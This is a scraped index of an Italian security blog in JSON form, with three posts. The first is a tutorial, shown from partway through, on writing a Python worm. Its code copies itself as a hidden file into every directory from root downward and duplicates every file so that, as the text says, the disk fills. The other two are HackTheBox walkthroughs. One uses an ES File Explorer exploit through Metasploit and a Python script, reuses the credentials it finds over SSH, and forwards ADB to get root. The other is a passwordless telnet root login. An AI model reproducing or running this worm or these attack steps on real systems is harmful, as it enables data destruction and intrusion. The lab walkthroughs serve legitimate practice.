target_dir_list if isinstance(target_dir_list, type(None)): self.iteration = 2 else: self.iteration = iteration # get own absolute path self.own_path = os.path.realpath(__file__) Qui abbiamo tre argomenti:\n path: definisce dove iniziare a cercare le directory (l\u0026rsquo;impostazione predefinita è la directory principale /) target_dir_list: l\u0026rsquo;utente può passare un elenco di directory di destinazione iniziali. Per impostazione predefinita è un elenco vuoto [] iteration: Ho usato questo parametro per definire quante istanze creerà il worm per ogni file esistente in una directory (il valore predefinito è 2 solo a scopo di test, puoi aumentare o diminuire il numero, o meglio fornire valur durante la creazione di un oggetto della classe)  Il primo metodo di cui abbiamo bisogno è elencare tutte le directory e le sottodirectory di destinazione in cui vogliamo copiare il nostro worm ei file esistenti nelle directory.\nQui, sto evitando i file nascosti poiché include anche le directory principali (i file nascosti iniziano con il punto . in Linux o macOS). A parte questo, aggiunge un file (le directory sono anche chiamate file nei file system basati su Unix) se si tratta di una directory e lo fa in modo ricorsivo per tutte le sottodirectory.\ndef list_directories(self,path): self.target_dir_list.append(path) files_in_current_directory = os.listdir(path) for file in files_in_current_directory: # avoid hidden files/directories (start with dot (.)) if not file.startswith(\u0026#39;.\u0026#39;): # get the full path absolute_path = os.path.join(path, file) print(absolute_path) if os.path.isdir(absolute_path): self.list_directories(absolute_path) else: pass Per replicare lo script stesso in tutte le directory di destinazione, otteniamo il percorso assoluto dello script che stiamo eseguendo, quindi copiamo il contenuto nelle directory di destinazione creando un nuovo file nascosto (inizia con un punto .) con lo stesso nome.\ndef create_new_worm(self): for directory in self.target_dir_list: destination = os.path.join(directory, \u0026#34;.worm.py\u0026#34;) # copy the script in the new directory with similar name shutil.copyfile(self.own_path, destination) Il seguente metodo verrà utilizzato per duplicare i file il numero di volte il valore che abbiamo dall\u0026rsquo;argomento di iterazione. Puoi inserire un numero elevato in modo che il disco rigido si riempia presto.\ndef copy_existing_files(self): for directory in self.target_dir_list: file_list_in_dir = os.listdir(directory) for file in file_list_in_dir: abs_path = os.path.join(directory, file) if not abs_path.startswith(\u0026#39;.\u0026#39;) and not os.path.isdir(abs_path): source = abs_path for i in range(self.iteration): destination = os.path.join(directory,(\u0026#34;.\u0026#34;+file+str(i))) shutil.copyfile(source, destination) In questo metodo, chiameremo tutti i nostri metodi precedenti. Quindi, quando chiamiamo questo metodo utilizzando il nostro oggetto creato, il worm avvierà tutte le azioni in sequenza.\ndef start_worm_actions(self): self.list_directories(self.path) print(self.target_dir_list) self.create_new_worm() self.copy_existing_files() Ora, creiamo la nostra funzione principale ed eseguiamo il codice:\nif __name__==\u0026#34;__main__\u0026#34;: current_directory = os.path.abspath(\u0026#34;\u0026#34;) worm = Worm(path=current_directory) worm.start_worm_actions() Qui, per evitare di riempire il nostro disco, usiamo la directory esistente solo usando os.path.abspath(\u0026quot;\u0026quot;), e passiamolo come argomento durante la creazione di un oggetto della classe Worm. Finalmente chiamiamo il metodo di integrazione e siamo a posto.\nEcco il codice completo:\nimport os import shutil class Worm: def __init__(self, path=None, target_dir_list=None, iteration=None): if isinstance(path, type(None)): self.path = \u0026#34;/\u0026#34; else: self.path = path if isinstance(target_dir_list, type(None)): self.target_dir_list = [] else: self.target_dir_list = target_dir_list if isinstance(target_dir_list, type(None)): self.iteration = 2 else: self.iteration = iteration # get own absolute path self.own_path = os.path.realpath(__file__) def list_directories(self,path): self.target_dir_list.append(path) files_in_current_directory = os.listdir(path) for file in files_in_current_directory: # avoid hidden files/directories (start with dot (.)) if not file.startswith(\u0026#39;.\u0026#39;): # get the full path absolute_path = os.path.join(path, file) print(absolute_path) if os.path.isdir(absolute_path): self.list_directories(absolute_path) else: pass def create_new_worm(self): for directory in self.target_dir_list: destination = os.path.join(directory, \u0026#34;.worm.py\u0026#34;) # copy the script in the new directory with similar name shutil.copyfile(self.own_path, destination) def copy_existing_files(self): for directory in self.target_dir_list: file_list_in_dir = os.listdir(directory) for file in file_list_in_dir: abs_path = os.path.join(directory, file) if not abs_path.startswith(\u0026#39;.\u0026#39;) and not os.path.isdir(abs_path): source = abs_path for i in range(self.iteration): destination = os.path.join(directory,(\u0026#34;.\u0026#34;+file+str(i))) shutil.copyfile(source, destination) def start_worm_actions(self): self.list_directories(self.path) print(self.target_dir_list) self.create_new_worm() self.copy_existing_files() if __name__==\u0026#34;__main__\u0026#34;: current_directory = os.path.abspath(\u0026#34;\u0026#34;) worm = Worm(path=current_directory) worm.start_worm_actions() Vediamo un esempio pratico, abbiamo creato questa struttura di file di testo e sottocartelle di prova:\nEseguiamo il worm 2 volte con il comando:\npython3 worm.py Ecco il risultato:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/","tags":["Malware Analysis","Malware","Worm","Python"],"title":"Scrivere un Worm in Python"},{"categories":["Walkthrough HackTheBox"],"contents":"Table of Contents:\n Enumerazione con Nmap Analisi delle porte  Sfruttamento dell’Exploit con Metasploit Sfruttamento dell’Exploit con CVE (Script Python)   Privilage Escalation   Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina. Infine, l’aggressore è in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l’Android Debug Bridge (ADB). Questa eventualità consente all’utente malintenzionato di eseguire comandi come utente root.\nEnumerazione con Nmap Eseguiamo l’enumerazione dei servizi con Nmap, facciamo una prima scansione con il seguente comando:\n1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) 2. nmap -p$ports -sC -sV [address] L’output sarà:\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 09:58 EST Nmap scan report for explore (10.10.10.247) Host is up (0.039s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 7190e3a7c95d836634883debb4c788fb (RSA) 5555/tcp filtered freeciv 34245/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????\u0026lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.93%I=7%D=11/29%Time=63861E0F%P=x86_64-pc-linux-gnu%r(N SF:ULL,24,\u0026#34;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port34245-TCP:V=7.93%I=7%D=11/29%Time=63861E0E%P=x86_64-pc-linux-gnu%r( SF:GenericLines,AA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2 SF:029\\x20Nov\\x202022\\x2014:59:13\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n SF:\\r\\nInvalid\\x20request\\x20line:\\x20\u0026#34;)%r(GetRequest,5C,\u0026#34;HTTP/1\\.1\\x20412 SF:\\x20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014: SF:59:13\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,B5,\u0026#34;HTTP/1 SF:\\.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\ SF:x2014:59:18\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x SF:20supported:\\x20OPTIONS\u0026#34;)%r(RTSPRequest,BB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:18\\x20GMT\\r\\nCon SF:tent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\ SF:r\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version SF::\\x20\\x20RTSP/1\\.0\u0026#34;)%r(Help,AE,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nD SF:ate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length: SF:\\x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnectio SF:n:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\u0026#34;)%r(SSLSessionRe SF:q,DD,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\ SF:x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x2 SF:0text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid SF:\\x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\ SF:?\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?\u0026lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\u0026#34;)%r(TerminalS SF:erverCookie,CA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x20 SF:29\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mst SF:shash=nmap\u0026#34;)%r(TLSSessionReq,DB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\n SF:Date:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length SF::\\x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnecti SF:on:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\ SF:0e\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\u0026#34;); Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.61 seconds Analisi delle porte Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso é 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:\nQuesto sito web mostra le assegnazioni delle porte e le vulnerabilità note.\nNello snippet di cui sopra possiamo vedere che la porta 5555 è utilizzata da Android Debug Bridge (ADB). Android Debug Bridge (adb) è uno strumento a riga di comando che consente agli utenti di comunicare con un dispositivo Android. Dato che la porta 5555 è filtrata e non è possibile connettersi tramite adb, cerchiamo online la porta 59777 che rivela il seguente risultato:\nQuesta porta è utilizzata dall’applicazione ES File Explorer File Manager per Android, secondo questo sito web. Questo sito web indica anche una vulnerabilità nota per questa applicazione, in cui un utente malintenzionato è in grado di eseguire comandi arbitrari sull’host. Di seguito vedremo due metodologie per raccogliere le credenziali ssh.\nSfruttamento dell’Exploit con Metasploit La ricerca nel framework metasploit rivela un modulo per questa vulnerabilità:\n1. msfconsole 2. search es file explorer  Il modulo di interesse è:\n# Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/es_file_explorer_open_port 2019-01-16 normal No ES File Explorer Open Port Utilizziamo questo modulo ed elenchiamo le sue opzioni:\n1. use auxiliary/scanner/http/es_file_explorer_open_port 2. options  Successivamente, si imposta il parametro RHOSTS con l’IP dell’host e si digita exploit:\n1. set RHOSTS 10.10.10.247 2. exploit  Il risultato è positivo. L’azione del parametro è stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi l’uscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.\nshow actions  Impostando l’azione su LISTPICS, si ottengono i seguenti risultati.\n1. set action LISTPICS 2. exploit  Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo l’azione su GETFILE e scarichiamo il file creds.jpg:\n1. set action GETFILE 2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg 3. exploit  Successivamente, possiamo aprire l’immagine utilizzando il visualizzatore di immagini feh:\n1. sudo apt install feh 2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg Sfruttamento dell’Exploit con CVE (Script Python) Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:\nSalviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per l’accesso ai dati nel telefono cellulare dell’utente e l’esecuzione dell’applicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo l’exploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quell’exploit:\npython3 [script].py --cmd GetDeviceInfo --ip [address]  Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:\npython3 [script].py listPics [address]  Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. C’è un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:\npython3 [script].py getFile [address] /storage/emulated/0/DCIM/creds.jpg  Entrambe le strade viste portano al medesimo risultato, ossia avere questo file con le credenziali ssh:\nQuesto sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per l’utente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.\nssh kristi@10.10.10.247 -p 2222  La flag user.txt si trova in /storage/emulated/0/user.txt:\nPrivilage Escalation Avendo accesso all’host remoto tramite SSH, si può eseguire il seguente comando per assicurarsi che la porta porta filtrata 5555, trovata in precedenza, sia in esecuzione:\nss -ntpl Poiché la porta 5555 è filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:\nssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:\n1. sudo apt install adb 2. adb --help Nella sezione rete vediamo che utilizzando l’istruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:\nadb connect 127.0.0.1:5555  È possibile elencare i dispositivi collegati eseguendo il seguente comando:\nadb devices  Quindi, si può digitare quanto segue per ottenere la shell sulla macchina remota:\nadb -s 127.0.0.1 shell Digitiamo “su” per diventare utenti root:\nNella directory data vi sará la nostra flag:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/","tags":["CTF","HackTheBox","Walkthrough","Android","Metasploit","CVE"],"title":"Walkthrough Explore"},{"categories":["Walkthrough HackTheBox"],"contents":"Table Of Contents:\n Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa è stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.\nIl comando é:\nnmap -sVC -n -A -Pn -p 22, 23, 80 [address] --min-rate 5000 L\u0026rsquo;output:\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 22:45 CET Nmap scan report for 10.129.46.55 Host is up (0.046s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet Linux telnetd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds Connessione a Telnet Troviamo la porta 23 aperta e sta eseguendo un servizio telnet, proviamo a connetterci alla porta telnet 23.\nUsa il comando:\nsudo apt-get install telnet se non lo hai installato o stai usando una VM, poi lanciamo:\ntelnet [address] L\u0026rsquo;output sarà:\nCi viene presentata una schermata di accesso. Tenendo presente il suggerimento fornito nell’attività precedente. Un utente root è in grado di accedere al servizio telnet senza password. Abbiamo provato a utilizzare il root e abbiamo ottenuto l’accesso.\nConfermiamo nel terminale se siamo l’utente root.\nSe elenchiamo i file nella directory di lavoro corrente, vediamo che flag.txt è elencato.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-meow/walkthrough_meow_ctf/","tags":["CTF","HackTheBox","Walkthrough","Telnet"],"title":"Walkthrough Meow"}]